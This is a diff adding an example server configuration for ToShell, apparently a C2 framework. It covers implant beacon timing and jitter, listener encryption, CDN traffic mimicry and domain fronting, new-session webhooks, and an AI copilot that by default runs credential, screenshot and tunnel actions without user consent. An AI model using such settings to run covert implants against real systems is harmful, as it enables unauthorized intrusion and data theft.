@@ -1,0 +1,101 @@
+# =====================================================================
+# ToShell Team Server 配置文件模板（开源示例）
+# 复制为 server.yaml 后按需修改；部署前请务必更改所有敏感项。
+#   Linux/macOS:  cp configs/server.yaml.example configs/server.yaml
+#   Windows:      copy configs\server.yaml.example configs\server.yaml
+# =====================================================================
+
+auth:
+    # 管理员密码：可填 bcrypt 哈希($2a$...)或明文，明文会被自动哈希。默认 toshell，部署后请立即修改。
+    admin_password: toshell
+    admin_username: admin
+    api_key_enabled: true
+    # API Key：调用 API 时用 X-API-Key 请求头传递；务必改为你自己的随机串。
+    api_keys: change-me-api-key
+    enabled: true
+    jwt_enabled: true
+    jwt_expire: 24
+    # JWT 签名密钥：留空首次启动会自动生成并写回；也可手动填 32 字节随机串。
+    jwt_key: ""
+
+database:
+    database: toshell
+    host: ""
+    password: ""
+    path: ./data/toshell.db
+    port: 5432
+    ssl_mode: disable
+    type: sqlite
+    username: ""
+
+implant:
+    interval: 5
+    jitter: 2
+    kill_date: ""
+    output_dir: ./implants
+    retry_count: 3
+    retry_wait: 5
+    working_hours: ""
+
+listener:
+    cert_file: ""
+    enabled: true
+    # 植入端加密密钥（AES-256）：留空首次启动自动生成；更换后需重新生成所有植入端。
+    encryption_key: ""
+    front_domain: ""
+    heartbeat_timeout: 60s
+    host: 0.0.0.0
+    key_file: ""
+    mimicry_profile: cdn
+    mimicry_site: ""
+    port: 8080
+    protocol: tcp
+    # 公网地址（服务器公网 IP/域名），生成的植入端连接它。
+    public_host: 127.0.0.1
+    tls_enabled: false
+    write_queue_size: 8192
+    mqtt_broker_url: ""
+    mqtt_topic_prefix: toshell
+    mqtt_embedded_broker: false
+
+logging:
+    compress: true
+    format: json
+    level: info
+    max_age: 30
+    max_backups: 10
+    max_size: 100
+    output: stdout
+
+server:
+    api_host: 0.0.0.0
+    api_port: 18081
+    host: 0.0.0.0
+    idle_timeout: 120s
+    max_connections: 1000
+    port: 8080
+    read_timeout: 30s
+    tls_cert: ""
+    tls_key: ""
+    trust_proxy_headers: false
+    write_timeout: 30s
+
+webhook:
+    content: "new session online: {hostname} ({username}@{os}/{arch}) from {remote_addr}"
+    enabled: false
+    format: auto
+    only_online: true
+    secret: ""
+    url: ""
+
+ai:
+    enabled: false
+    # OpenAI 兼容的 chat/completions 端点（如 https://api.deepseek.com/v1）
+    base_url: ""
+    api_key: ""
+    model: deepseek-chat
+    timeout: 60
+    max_turns: 20
+    # 权限模式：auto=全自动(默认,工具直接执行)；normal=影响会话的操作(下发/文件/进程/凭据/截屏/隧道/插件等)
+    # 执行前需用户同意(副驾驶会拦截并请求确认)；任务流(delegate/剧本)除外。
+    consent_mode: auto
